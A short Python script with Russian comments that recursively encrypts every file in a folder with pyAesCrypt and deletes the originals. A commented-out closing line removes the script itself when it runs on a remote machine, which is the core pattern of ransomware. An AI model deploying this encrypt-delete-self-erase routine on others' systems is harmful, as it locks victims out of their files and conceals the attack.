"""
Шифрование файлов и директорий
"""


import pyAesCrypt
import os


# Функция шифрования файла
def encryption(file, password):

    # Задаём размер буфера
    buffer_size = 512 * 1024

    # Вызываем метод шифрования
    pyAesCrypt.encryptFile(
        str(file),
        str(file) + ".crp",
        password,
        buffer_size
    )

    # Чтобы видеть результат, выводим на печать имя зашифрованного файла
    print("[Файл '" + str(os.path.splitext(file)[0]) + "' зашифрован]")

    # Удаляем исходный файл
    os.remove(file)


# Функция сканирования директорий
def walking_by_dirs(dir, password):

    # Перебираем все поддиректории в указанной директории
    for name in os.listdir(dir):
        path = os.path.join(dir, name)

        # Если находим файл, то шифруем его
        if os.path.isfile(path):
            try:
                encryption(path, password)
            except Exception as ex:
                print(ex)
        # Если находим директорию, то повторяем цикл в поисках файлов
        else:
            walking_by_dirs(path, password)


password = input("Введите пароль для шифрования: ")
walking_by_dirs("files_for_encryption", password)    # Первый аргумент - директория с файлами для шифрования

# Удаление шифрующих файлов, если шифруем файлы на удалённой машине
# os.remove(str(sys.argv[0]))
